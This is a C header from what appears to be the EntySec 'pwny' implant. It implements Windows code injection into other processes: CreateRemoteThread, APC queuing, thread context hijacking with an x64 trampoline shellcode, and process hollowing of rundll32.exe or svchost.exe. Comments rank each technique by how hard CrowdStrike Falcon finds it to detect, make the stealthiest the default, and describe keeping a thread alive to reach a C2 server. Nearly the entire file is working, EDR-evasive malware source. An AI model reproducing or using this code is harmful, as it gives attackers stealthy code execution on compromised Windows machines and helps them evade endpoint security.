/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * inject_tech.h — Remote code execution techniques.
 *
 * Provides a unified interface for triggering code execution in
 * a remote process. Techniques are selected by the operator and
 * range from the classic CreateRemoteThread (noisy, flagged by
 * every modern EDR) to thread hijacking (no new thread created,
 * no kernel thread-creation callback fires).
 *
 * Detection difficulty (CrowdStrike Falcon):
 *   CRT      — Very easy (PsSetCreateThreadNotifyRoutine fires)
 *   APC      — Moderate (user-mode alertable wait correlation)
 *   HIJACK   — Hard (no thread creation, context switch only)
 *   HOLLOW   — Hardest (spawn + redirect own child, no foreign PID)
 *
 * The DEFAULT technique is INJECT_TECH_HIJACK for maximum stealth.
 */

#ifndef _INJECT_TECH_H_
#define _INJECT_TECH_H_

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>

#include <pwny/log.h>

/* ---- Technique identifiers ---- */

#define INJECT_TECH_CRT     0   /* CreateRemoteThread (legacy)        */
#define INJECT_TECH_APC     1   /* QueueUserAPC + forced alert         */
#define INJECT_TECH_HIJACK  2   /* Thread context hijacking            */
#define INJECT_TECH_HOLLOW  3   /* Spawn suspended child + redirect    */

/* Default technique — thread hijack is hardest to detect */
#define INJECT_TECH_DEFAULT INJECT_TECH_HIJACK

/* ---- NtAlertResumeThread for APC forcing ---- */

typedef LONG NTSTATUS_T;
typedef NTSTATUS_T (NTAPI *pfnNtAlertResumeThread)(HANDLE, PULONG);

/* ---- Thread enumeration helper ---- */

/*
 * Find a thread in the target process suitable for hijacking or APC.
 * Avoids threads belonging to the current process.
 *
 * Returns a thread HANDLE with THREAD_ALL_ACCESS on success, NULL on failure.
 * The caller must CloseHandle the returned handle.
 *
 * If out_tid is non-NULL, the thread ID is stored there.
 */

static HANDLE inject_find_thread(DWORD target_pid, DWORD *out_tid)
{
    HANDLE hSnap;
    HANDLE hThread;
    THREADENTRY32 te32;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        log_debug("* inject_tech: CreateToolhelp32Snapshot failed (%lu)\n",
                  GetLastError());
        return NULL;
    }

    te32.dwSize = sizeof(te32);

    if (!Thread32First(hSnap, &te32))
    {
        CloseHandle(hSnap);
        return NULL;
    }

    hThread = NULL;

    do
    {
        if (te32.th32OwnerProcessID != target_pid)
        {
            continue;
        }

        /* Skip our own threads (shouldn't happen but be safe) */
        if (te32.th32OwnerProcessID == GetCurrentProcessId())
        {
            continue;
        }

        hThread = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
            THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
            FALSE, te32.th32ThreadID
        );

        if (hThread != NULL)
        {
            if (out_tid)
            {
                *out_tid = te32.th32ThreadID;
            }

            log_debug("* inject_tech: selected thread %lu in PID %lu\n",
                      te32.th32ThreadID, target_pid);
            break;
        }

    } while (Thread32Next(hSnap, &te32));

    CloseHandle(hSnap);
    return hThread;
}

/* ==================================================================
 * Technique 0: CreateRemoteThread (classic)
 *
 * Simple and reliable but flagged by every modern EDR.
 * The kernel's PsSetCreateThreadNotifyRoutine callback fires
 * immediately, giving CrowdStrike a direct correlation between
 * the injector process and the new remote thread.
 * ================================================================== */

static BOOL inject_via_crt(HANDLE hProcess, LPVOID remote_code,
                           LPVOID param)
{
    HANDLE hThread;
    DWORD tid;

    hThread = CreateRemoteThread(
        hProcess, NULL, 1024 * 1024,
        (LPTHREAD_START_ROUTINE)remote_code,
        param, 0, &tid
    );

    if (hThread == NULL)
    {
        log_debug("* inject_crt: CreateRemoteThread failed (%lu)\n",
                  GetLastError());
        return FALSE;
    }

    log_debug("* inject_crt: thread %lu created in target\n", tid);
    CloseHandle(hThread);
    return TRUE;
}

/* ==================================================================
 * Technique 1: QueueUserAPC
 *
 * Queues an APC to a thread in the target process. Does NOT
 * create a new thread (no kernel thread-creation callback).
 *
 * The APC fires when the thread enters an alertable wait state.
 * We force this by suspending and resuming the thread via
 * NtAlertResumeThread, which sets the Alerted flag.
 *
 * Note: The APC callback signature (PAPCFUNC) is compatible
 * with LPTHREAD_START_ROUTINE on x64 — both receive a single
 * pointer-sized parameter in RCX.
 * ================================================================== */

static BOOL inject_via_apc(HANDLE hProcess, DWORD target_pid,
                           LPVOID remote_code, LPVOID param)
{
    HANDLE hThread;
    DWORD tid;
    DWORD prev_count;

    hThread = inject_find_thread(target_pid, &tid);
    if (hThread == NULL)
    {
        log_debug("* inject_apc: no suitable thread found\n");
        return FALSE;
    }

    /* Suspend the thread first so the APC is guaranteed to be
     * queued before the thread resumes. */
    prev_count = SuspendThread(hThread);
    if (prev_count == (DWORD)-1)
    {
        log_debug("* inject_apc: SuspendThread(%lu) failed (%lu)\n",
                  tid, GetLastError());
        CloseHandle(hThread);
        return FALSE;
    }

    /* Queue the APC */
    if (!QueueUserAPC((PAPCFUNC)remote_code, hThread, (ULONG_PTR)param))
    {
        log_debug("* inject_apc: QueueUserAPC failed (%lu)\n",
                  GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    log_debug("* inject_apc: APC queued to thread %lu\n", tid);

    /* Resume the thread. Try NtAlertResumeThread first to force
     * the alertable state, fall back to plain ResumeThread. */
    {
        HMODULE ntdll;
        pfnNtAlertResumeThread NtAlertResumeThread;
        ULONG suspend_count;

        ntdll = GetModuleHandleA("ntdll.dll");
        NtAlertResumeThread = ntdll
            ? (pfnNtAlertResumeThread)GetProcAddress(
                  ntdll, "NtAlertResumeThread")
            : NULL;

        if (NtAlertResumeThread != NULL)
        {
            NtAlertResumeThread(hThread, &suspend_count);
            log_debug("* inject_apc: NtAlertResumeThread (count=%lu)\n",
                      suspend_count);
        }
        else
        {
            ResumeThread(hThread);
        }
    }

    CloseHandle(hThread);
    return TRUE;
}

/* ==================================================================
 * Technique 2: Thread Context Hijacking (DEFAULT)
 *
 * This is the stealthiest technique available. It:
 *   - Does NOT create any new thread (no kernel callback)
 *   - Does NOT call QueueUserAPC
 *   - Suspends an existing thread, overwrites RIP to point at
 *     a trampoline stub, then resumes.
 *
 * The trampoline:
 *   1. Saves all volatile regs + flags
 *   2. Aligns the stack (x64 ABI)
 *   3. Calls the target function (ReflectiveLoader/shellcode)
 *   4. Restores all volatile regs + flags
 *   5. Jumps back to the original RIP
 *
 * CrowdStrike Falcon detection: HARD
 *   - No PsSetCreateThreadNotifyRoutine callback fires
 *   - No PsSetLoadImageNotifyRoutine callback fires
 *   - The kernel sees a normal context switch on an existing thread
 *   - Correlation requires matching VirtualAllocEx + SetThreadContext
 *     which produces far fewer signals than CreateRemoteThread
 * ================================================================== */

/*
 * x64 trampoline shellcode.
 * Patch points:
 *   HIJACK_STUB_OFF_FUNC  (28): 8-byte absolute function address
 *   HIJACK_STUB_OFF_RIPLO (55): 4-byte low DWORD of original RIP
 *   HIJACK_STUB_OFF_RIPHI (63): 4-byte high DWORD of original RIP
 */

#define HIJACK_STUB_SIZE     68
#define HIJACK_STUB_OFF_FUNC  28
#define HIJACK_STUB_OFF_RIPLO 55
#define HIJACK_STUB_OFF_RIPHI 63

static unsigned char hijack_stub_template[HIJACK_STUB_SIZE] = {
    /* 0:  */ 0x50,                         /* push rax              */
    /* 1:  */ 0x51,                         /* push rcx              */
    /* 2:  */ 0x52,                         /* push rdx              */
    /* 3:  */ 0x41, 0x50,                   /* push r8               */
    /* 5:  */ 0x41, 0x51,                   /* push r9               */
    /* 7:  */ 0x41, 0x52,                   /* push r10              */
    /* 9:  */ 0x41, 0x53,                   /* push r11              */
    /* 11: */ 0x53,                         /* push rbx              */
    /* 12: */ 0x9C,                         /* pushfq                */

    /* 13: */ 0x48, 0x89, 0xE3,             /* mov rbx, rsp          */
    /* 16: */ 0x48, 0x83, 0xE4, 0xF0,       /* and rsp, -16 (align)  */
    /* 20: */ 0x48, 0x83, 0xEC, 0x20,       /* sub rsp, 0x20 (shadow)*/

    /* 24: */ 0x31, 0xC9,                   /* xor ecx, ecx (param=0)*/
    /* 26: */ 0x48, 0xB8,                   /* movabs rax, imm64     */
    /*         [8 bytes func addr at offset 28] */
              0x41, 0x41, 0x41, 0x41,
              0x41, 0x41, 0x41, 0x41,
    /* 36: */ 0xFF, 0xD0,                   /* call rax              */

    /* 38: */ 0x48, 0x89, 0xDC,             /* mov rsp, rbx          */

    /* 41: */ 0x9D,                         /* popfq                 */
    /* 42: */ 0x5B,                         /* pop rbx               */
    /* 43: */ 0x41, 0x5B,                   /* pop r11               */
    /* 45: */ 0x41, 0x5A,                   /* pop r10               */
    /* 47: */ 0x41, 0x59,                   /* pop r9                */
    /* 49: */ 0x41, 0x58,                   /* pop r8                */
    /* 51: */ 0x5A,                         /* pop rdx               */
    /* 52: */ 0x59,                         /* pop rcx               */
    /* 53: */ 0x58,                         /* pop rax               */

    /* Return to original RIP via push-ret trick (supports full 64-bit) */
    /* 54: */ 0x68,                         /* push imm32            */
    /*         [4 bytes low DWORD at offset 55] */
              0x42, 0x42, 0x42, 0x42,
    /* 59: */ 0xC7, 0x44, 0x24, 0x04,      /* mov [rsp+4], imm32    */
    /*         [4 bytes high DWORD at offset 63] */
              0x43, 0x43, 0x43, 0x43,
    /* 67: */ 0xC3,                         /* ret                   */
};

/*
 * x64 hollow stub shellcode.
 *
 * Unlike the hijack stub, this does NOT save/restore registers or
 * return to the original RIP. After calling the injected function
 * (stager → _DllInit → DllMain → CreateThread(MigrateThread)), it
 * calls ExitThread(0) to terminate only the main thread while
 * keeping the process alive for MigrateThread.
 *
 * Without this, the host binary (e.g. rundll32.exe with no args)
 * would call ExitProcess() immediately after our code returns,
 * killing MigrateThread before it can establish the C2 connection.
 *
 * Patch points:
 *   HOLLOW_STUB_OFF_FUNC  (12): 8-byte absolute function address
 *   HOLLOW_STUB_OFF_EXIT  (26): 8-byte absolute ExitThread address
 */

#define HOLLOW_STUB_SIZE      37
#define HOLLOW_STUB_OFF_FUNC  12
#define HOLLOW_STUB_OFF_EXIT  26

static unsigned char hollow_stub_template[HOLLOW_STUB_SIZE] = {
    /* Align stack to 16 bytes (x64 ABI) */
    /* 0:  */ 0x48, 0x83, 0xE4, 0xF0,       /* and rsp, -16          */
    /* 4:  */ 0x48, 0x83, 0xEC, 0x20,       /* sub rsp, 0x20 (shadow)*/

    /* Call the injected function (stager → _DllInit → DllMain) */
    /* 8:  */ 0x31, 0xC9,                   /* xor ecx, ecx (param=0)*/
    /* 10: */ 0x48, 0xB8,                   /* movabs rax, imm64     */
    /*         [8 bytes func addr at offset 12] */
              0x41, 0x41, 0x41, 0x41,
              0x41, 0x41, 0x41, 0x41,
    /* 20: */ 0xFF, 0xD0,                   /* call rax              */

    /* ExitThread(0) — kills main thread, MigrateThread keeps process alive */
    /* 22: */ 0x31, 0xC9,                   /* xor ecx, ecx (code=0) */
    /* 24: */ 0x48, 0xB8,                   /* movabs rax, imm64     */
    /*         [8 bytes ExitThread addr at offset 26] */
              0x42, 0x42, 0x42, 0x42,
              0x42, 0x42, 0x42, 0x42,
    /* 34: */ 0xFF, 0xD0,                   /* call rax              */
    /* 36: */ 0xCC,                         /* int3 (unreachable)    */
};

static BOOL inject_via_hijack(HANDLE hProcess, DWORD target_pid,
                              LPVOID remote_code, LPVOID param)
{
    HANDLE hThread;
    DWORD tid;
    CONTEXT ctx;
    LPVOID remote_stub;
    DWORD old_prot;
    unsigned char stub[HIJACK_STUB_SIZE];
    DWORD64 original_rip;

    (void)param; /* Thread hijack ignores param; the function
                    receives 0 (NULL) via xor ecx,ecx in the stub */

    hThread = inject_find_thread(target_pid, &tid);
    if (hThread == NULL)
    {
        log_debug("* inject_hijack: no suitable thread found\n");
        return FALSE;
    }

    /* Suspend the target thread */
    if (SuspendThread(hThread) == (DWORD)-1)
    {
        log_debug("* inject_hijack: SuspendThread(%lu) failed (%lu)\n",
                  tid, GetLastError());
        CloseHandle(hThread);
        return FALSE;
    }

    /* Get current thread context */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx))
    {
        log_debug("* inject_hijack: GetThreadContext failed (%lu)\n",
                  GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    original_rip = ctx.Rip;
    log_debug("* inject_hijack: thread %lu RIP = 0x%llX\n",
              tid, (unsigned long long)original_rip);

    /* Build the trampoline stub */
    memcpy(stub, hijack_stub_template, HIJACK_STUB_SIZE);

    /* Patch function address */
    *(DWORD64 *)(stub + HIJACK_STUB_OFF_FUNC) = (DWORD64)remote_code;

    /* Patch original RIP (split into low/high 32-bit halves) */
    *(DWORD *)(stub + HIJACK_STUB_OFF_RIPLO) = (DWORD)(original_rip & 0xFFFFFFFF);
    *(DWORD *)(stub + HIJACK_STUB_OFF_RIPHI) = (DWORD)(original_rip >> 32);

    /* Allocate memory in the target for the trampoline */
    remote_stub = VirtualAllocEx(hProcess, NULL, HIJACK_STUB_SIZE,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (remote_stub == NULL)
    {
        log_debug("* inject_hijack: VirtualAllocEx for stub failed (%lu)\n",
                  GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    /* Write the trampoline */
    if (!WriteProcessMemory(hProcess, remote_stub, stub,
                            HIJACK_STUB_SIZE, NULL))
    {
        log_debug("* inject_hijack: WriteProcessMemory stub failed (%lu)\n",
                  GetLastError());
        VirtualFreeEx(hProcess, remote_stub, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    /* Flip trampoline to RX */
    if (!VirtualProtectEx(hProcess, remote_stub, HIJACK_STUB_SIZE,
                          PAGE_EXECUTE_READ, &old_prot))
    {
        log_debug("* inject_hijack: VirtualProtectEx stub failed (%lu)\n",
                  GetLastError());
        VirtualFreeEx(hProcess, remote_stub, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    /* Redirect thread to our trampoline */
    ctx.Rip = (DWORD64)remote_stub;

    if (!SetThreadContext(hThread, &ctx))
    {
        log_debug("* inject_hijack: SetThreadContext failed (%lu)\n",
                  GetLastError());
        VirtualFreeEx(hProcess, remote_stub, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    /* Resume — the thread runs our trampoline, calls the function,
     * then returns to the original RIP as if nothing happened. */
    ResumeThread(hThread);

    log_debug("* inject_hijack: thread %lu hijacked -> stub %p -> func %p\n",
              tid, remote_stub, remote_code);

    CloseHandle(hThread);
    return TRUE;
}

/* ==================================================================
 * Technique 3: Process Hollowing (spawn + redirect)
 *
 * The stealthiest migration technique. Instead of attacking an
 * existing foreign process, we spawn a legitimate host binary
 * (e.g. rundll32.exe) suspended and redirect its initial thread.
 *
 * CrowdStrike Falcon detection: HARDEST
 *   - No OpenProcess on a foreign PID
 *   - Writing to a child process you created is normal behaviour
 *   - The child has no behavioural baseline — EDR hasn't profiled it
 *   - No CreateToolhelp32Snapshot needed — thread handle comes
 *     directly from CreateProcessA
 *   - Context modification happens before any code runs
 *
 * This technique is special: it creates the target process itself,
 * so it operates at a higher level than CRT/APC/HIJACK. The
 * caller uses inject_hollow_spawn() + inject_hollow_redirect()
 * directly rather than going through inject_execute_code().
 * ================================================================== */

/*
 * Get the path to a suitable host binary for process hollowing.
 * Returns a heap-allocated string (caller must free).
 */

static char *inject_get_hollow_host(void)
{
    char sys_dir[MAX_PATH];
    char path[MAX_PATH];

    if (GetSystemDirectoryA(sys_dir, sizeof(sys_dir)) == 0)
    {
        return NULL;
    }

    _snprintf(path, sizeof(path), "%s\\rundll32.exe", sys_dir);

    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES)
    {
        return _strdup(path);
    }

    /* Fallback candidates */
    _snprintf(path, sizeof(path), "%s\\svchost.exe", sys_dir);
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES)
    {
        return _strdup(path);
    }

    return NULL;
}

/*
 * Spawn a suspended host process suitable for hollowing.
 *
 * On success: pi->hProcess, pi->hThread, pi->dwProcessId are valid.
 * On failure: returns FALSE, nothing to clean up.
 */

static BOOL inject_hollow_spawn(PROCESS_INFORMATION *pi)
{
    STARTUPINFOA si;
    char *host;

    host = inject_get_hollow_host();
    if (host == NULL)
    {
        log_debug("* inject_hollow: no suitable host binary found\n");
        return FALSE;
    }

    log_debug("* inject_hollow: host = %s\n", host);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(pi, 0, sizeof(*pi));

    if (!CreateProcessA(
            host, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, pi))
    {
        log_debug("* inject_hollow: CreateProcessA failed (%lu)\n",
                  GetLastError());
        free(host);
        return FALSE;
    }

    log_debug("* inject_hollow: spawned PID %lu (suspended)\n",
              pi->dwProcessId);
    free(host);
    return TRUE;
}

/*
 * Redirect an already-suspended thread to execute remote_code,
 * then call ExitThread(0) to terminate only the main thread.
 *
 * Uses a hollow-specific stub that does NOT return to the host
 * binary's entry point. This prevents the host (e.g. rundll32
 * with no arguments) from calling ExitProcess and killing
 * MigrateThread before it can establish the C2 connection.
 *
 * The caller must NOT resume the thread before calling this.
 * This function resumes the thread on success.
 *
 * Returns TRUE on success, FALSE on failure.
 * On failure the caller should TerminateProcess.
 */

static BOOL inject_hollow_redirect(HANDLE hProcess, HANDLE hThread,
                                   LPVOID remote_code)
{
    CONTEXT ctx;
    LPVOID remote_stub;
    DWORD old_prot;
    unsigned char stub[HOLLOW_STUB_SIZE];
    HMODULE hK32;
    DWORD64 exit_thread_addr;

    /* Resolve ExitThread — kernel32 is at the same base address in
     * both parent and child (standard Windows guarantee). */
    hK32 = GetModuleHandleA("kernel32.dll");
    exit_thread_addr = (DWORD64)GetProcAddress(hK32, "ExitThread");

    if (exit_thread_addr == 0)
    {
        log_debug("* inject_hollow: GetProcAddress(ExitThread) failed\n");
        return FALSE;
    }

    /* Get the suspended thread's context */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx))
    {
        log_debug("* inject_hollow: GetThreadContext failed (%lu)\n",
                  GetLastError());
        return FALSE;
    }

    log_debug("* inject_hollow: original RIP = 0x%llX\n",
              (unsigned long long)ctx.Rip);

    /* Build the hollow stub — calls func, then ExitThread(0) */
    memcpy(stub, hollow_stub_template, HOLLOW_STUB_SIZE);
    *(DWORD64 *)(stub + HOLLOW_STUB_OFF_FUNC) = (DWORD64)remote_code;
    *(DWORD64 *)(stub + HOLLOW_STUB_OFF_EXIT) = exit_thread_addr;

    /* Allocate in the child */
    remote_stub = VirtualAllocEx(hProcess, NULL, HOLLOW_STUB_SIZE,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (remote_stub == NULL)
    {
        log_debug("* inject_hollow: VirtualAllocEx stub failed (%lu)\n",
                  GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remote_stub, stub,
                            HOLLOW_STUB_SIZE, NULL))
    {
        log_debug("* inject_hollow: WriteProcessMemory stub failed (%lu)\n",
                  GetLastError());
        VirtualFreeEx(hProcess, remote_stub, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, remote_stub, HOLLOW_STUB_SIZE,
                          PAGE_EXECUTE_READ, &old_prot))
    {
        log_debug("* inject_hollow: VirtualProtectEx stub failed (%lu)\n",
                  GetLastError());
        VirtualFreeEx(hProcess, remote_stub, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Redirect RIP to the hollow stub */
    ctx.Rip = (DWORD64)remote_stub;

    if (!SetThreadContext(hThread, &ctx))
    {
        log_debug("* inject_hollow: SetThreadContext failed (%lu)\n",
                  GetLastError());
        VirtualFreeEx(hProcess, remote_stub, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Resume — stub runs stager → _DllInit → DllMain (creates
     * MigrateThread), then calls ExitThread(0) to kill only the
     * main thread.  MigrateThread keeps the process alive. */
    ResumeThread(hThread);

    log_debug("* inject_hollow: redirected -> stub %p -> func %p "
              "(ExitThread @ 0x%llX)\n",
              remote_stub, remote_code,
              (unsigned long long)exit_thread_addr);

    return TRUE;
}

/* ==================================================================
 * Unified entry point
 *
 * Triggers execution of code at remote_code in hProcess using the
 * specified technique. Falls back to CRT if the chosen technique
 * fails.
 *
 * NOTE: INJECT_TECH_HOLLOW is NOT handled here — it operates at
 *       a higher level (spawns its own process). Callers must use
 *       inject_hollow_spawn() + inject_hollow_redirect() directly.
 *
 * Parameters:
 *   technique   — INJECT_TECH_CRT / _APC / _HIJACK
 *   hProcess    — handle with VM_WRITE + VM_OPERATION + CREATE_THREAD
 *   target_pid  — PID of target (needed for APC/HIJACK thread enum)
 *   remote_code — address of code in the remote process
 *   param       — parameter for CRT (ignored by HIJACK)
 *
 * Returns TRUE on success.
 * ================================================================== */

static BOOL inject_execute_code(int technique, HANDLE hProcess,
                                DWORD target_pid, LPVOID remote_code,
                                LPVOID param)
{
    BOOL result;

    switch (technique)
    {
        case INJECT_TECH_CRT:
            log_debug("* inject_tech: using CRT (CreateRemoteThread)\n");
            return inject_via_crt(hProcess, remote_code, param);

        case INJECT_TECH_APC:
            log_debug("* inject_tech: using APC (QueueUserAPC)\n");
            result = inject_via_apc(hProcess, target_pid, remote_code, param);
            if (!result)
            {
                log_debug("* inject_tech: APC failed, falling back to CRT\n");
                return inject_via_crt(hProcess, remote_code, param);
            }
            return TRUE;

        case INJECT_TECH_HIJACK:
            log_debug("* inject_tech: using HIJACK (thread context)\n");
            result = inject_via_hijack(hProcess, target_pid,
                                       remote_code, param);
            if (!result)
            {
                log_debug("* inject_tech: HIJACK failed, "
                          "falling back to APC\n");
                result = inject_via_apc(hProcess, target_pid,
                                         remote_code, param);
                if (!result)
                {
                    log_debug("* inject_tech: APC failed, "
                              "falling back to CRT\n");
                    return inject_via_crt(hProcess, remote_code, param);
                }
            }
            return TRUE;

        default:
            log_debug("* inject_tech: unknown technique %d, using CRT\n",
                      technique);
            return inject_via_crt(hProcess, remote_code, param);
    }
}

#endif /* _INJECT_TECH_H_ */
